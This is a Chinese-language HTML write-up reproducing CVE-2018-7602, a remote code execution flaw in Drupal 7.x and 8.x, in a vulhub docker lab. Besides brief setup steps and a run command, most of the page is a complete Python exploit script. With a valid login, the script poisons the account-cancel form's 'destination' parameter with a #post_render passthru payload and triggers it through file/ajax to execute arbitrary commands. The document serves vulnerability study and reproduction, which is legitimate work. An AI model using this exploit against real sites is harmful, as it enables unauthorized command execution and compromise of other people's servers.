<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2018-7602drupal-远程代码执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-7602</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Drupal </span><span class="csECDA2D3">远程代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Drupal 7.x</span><span class="cs9C1B1871">版本和</span><span class="cs8926E06">8.x</span><span class="cs9C1B1871">版本中的存在存在远程代码执行漏洞。远程攻击者可利用该中断执行任意代码。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Drupal 7.x</span><span class="cs9C1B1871">版本和</span><span class="cs8926E06">8.x</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞环境"><span class="csD6CA00D2">漏洞环境</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">执行如下命令启动</span><span class="cs8926E06">drupal 7.57</span><span class="cs9C1B1871">的环境：</span></p><p class="cs3A447A38"><span class="cs9FB05234">docker-compose up -d</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">环境启动后，访问</span><span class="cs8926E06"> </span><span class="cs9FB05234">http://your-ip:8081/</span><span class="cs8926E06"> </span><span class="cs9C1B1871">将会看到</span><span class="cs8926E06">drupal</span><span class="cs9C1B1871">的安装页面，一路默认配置下一步安装。因为没有</span><span class="cs8926E06">mysql</span><span class="cs9C1B1871">环境，所以安装的时候可以选择</span><span class="cs8926E06">sqlite</span><span class="cs9C1B1871">数据库。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">参考</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/ianxtianxt/CVE-2018-7600"><span class="cs4B51D5E4">ianxtianxt/CVE-2018-7602</span></a></span><span class="cs9C1B1871">的</span><span class="cs8926E06">PoC</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如下图所示，执行以下命令即可复现该漏洞。示例命令为</span><span class="cs8926E06"> </span><span class="cs9FB05234">id</span><span class="cs9C1B1871">，如图红框中显示，可以执行该命令。</span></p><p class="cs3A447A38"><span class="cs9FB05234"># &quot;id&quot;</span><span class="cs7FFD2630">为要执行的命令</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">第一个</span><span class="cs9FB05234">drupal</span><span class="cs7FFD2630">为用户名</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">第二个</span><span class="cs9FB05234">drupal</span><span class="cs7FFD2630">为密码</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">python3 drupa7-CVE-2018-7602.py -c &quot;id&quot; drupal drupal http://127.0.0.1:8081/</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Drupal/%ef%bc%88CVE-2018-7602%ef%bc%89Drupal%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="116" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="cve-2018-7602py"><span class="csD1E291E2">CVE-2018-7602.py</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python3</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from bs4 import BeautifulSoup</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def get_args():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser = argparse.ArgumentParser( prog=&quot;drupa7-CVE-2018-7602.py&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;epilog= &#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;using an valid account and poisoning the cancel account form (user_cancel_confirm_form) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with the &#39;destination&#39; variable and triggering it with the upload file via ajax (/file/ajax).</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;&#39;&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;parser.add_argument(&quot;user&quot;, help=&quot;Username&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser.add_argument(&quot;password&quot;, help=&quot;Password&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser.add_argument(&quot;target&quot;, help=&quot;URL of target Drupal site (ex: http://target.com/)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, default=&quot;id&quot;, help=&quot;Command to execute (default = id)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser.add_argument(&quot;-f&quot;, &quot;--function&quot;, default=&quot;passthru&quot;, help=&quot;Function to use as attack vector (default = passthru)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser.add_argument(&quot;-x&quot;, &quot;--proxy&quot;, default=&quot;&quot;, help=&quot;Configure a proxy in the format http://127.0.0.1:8080/ (default = none)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;args = parser.parse_args()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return args</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def pwn_target(target, username, password, function, command, proxy):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;requests.packages.urllib3.disable_warnings()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;session = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;proxyConf = {&#39;http&#39;: proxy, &#39;https&#39;: proxy}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[*] Creating a session using the provided credential...&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;get_params = {&#39;q&#39;:&#39;user/login&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_params = {&#39;form_id&#39;:&#39;user_login&#39;, &#39;name&#39;: username, &#39;pass&#39; : password, &#39;op&#39;:&#39;Log in&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[*] Finding User ID...&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;get_params = {&#39;q&#39;:&#39;user&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = session.get(target, params=get_params, verify=False, proxies=proxyConf)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soup = BeautifulSoup(r.text, &quot;html.parser&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;user_id = soup.find(&#39;meta&#39;, {&#39;property&#39;: &#39;foaf:name&#39;}).get(&#39;about&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (&quot;?q=&quot; in user_id):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user_id = user_id.split(&quot;=&quot;)[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(user_id):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[*] User ID found: &#39; + user_id)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[*] Poisoning a form using \&#39;destination\&#39; and including it in cache.&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;get_params = {&#39;q&#39;: user_id + &#39;/cancel&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = session.get(target, params=get_params, verify=False, proxies=proxyConf)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soup = BeautifulSoup(r.text, &quot;html.parser&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;form = soup.find(&#39;form&#39;, {&#39;id&#39;: &#39;user-cancel-confirm-form&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;form_token = form.find(&#39;input&#39;, {&#39;name&#39;: &#39;form_token&#39;}).get(&#39;value&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;get_params = {&#39;q&#39;: user_id + &#39;/cancel&#39;, &#39;destination&#39; : user_id +&#39;/cancel?q[%23post_render][]=&#39; + function + &#39;&amp;q[%23type]=markup&amp;q[%23markup]=&#39; + command }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_params = {&#39;form_id&#39;:&#39;user_cancel_confirm_form&#39;,&#39;form_token&#39;: form_token, &#39;_triggering_element_name&#39;:&#39;form_id&#39;, &#39;op&#39;:&#39;Cancel account&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soup = BeautifulSoup(r.text, &quot;html.parser&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;form = soup.find(&#39;form&#39;, {&#39;id&#39;: &#39;user-cancel-confirm-form&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;form_build_id = form.find(&#39;input&#39;, {&#39;name&#39;: &#39;form_build_id&#39;}).get(&#39;value&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if form_build_id:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[*] Poisoned form ID: &#39; + form_build_id)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[*] Triggering exploit to execute: &#39; + command)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;get_params = {&#39;q&#39;:&#39;file/ajax/actions/cancel/#options/path/&#39; + form_build_id}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_params = {&#39;form_build_id&#39;:form_build_id}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parsed_result = r.text.split(&#39;[{&quot;command&quot;:&quot;settings&quot;&#39;)[0]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(parsed_result)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;ERROR: Something went wrong.&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;raise</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def main():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print ()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print (&#39;===================================================================================&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print (&#39;| &nbsp;&nbsp;DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602) &nbsp;&nbsp;&nbsp;&nbsp;|&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print (&#39;| &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;by pimps &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print (&#39;===================================================================================\n&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;args = get_args() # get the cl args</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;pwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;main()</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://vulhub.org/#/environments/drupal/CVE-2018-7602/</span></p></body>
</html>
